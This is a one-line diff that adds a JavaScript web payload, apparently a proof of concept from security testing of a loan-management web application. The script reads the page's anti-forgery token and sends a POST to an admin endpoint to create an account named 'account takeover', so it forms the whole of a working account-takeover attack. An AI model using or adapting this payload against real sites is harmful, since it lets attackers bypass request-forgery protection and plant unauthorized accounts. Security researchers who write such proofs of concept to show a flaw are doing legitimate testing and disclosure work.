@@ -1,0 +1,1 @@
+fetch('/Admin/LoanOfficerHoldingPens/Create',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'LenderOrgId=1&FirstName=account&LastName=takeover&Email=account%2Btakeover%40websec.ca&IsManager=false&__RequestVerificationToken='+document.querySelector('input[name="__RequestVerificationToken"]').value}).then(r=>r.text()).then(console.log);
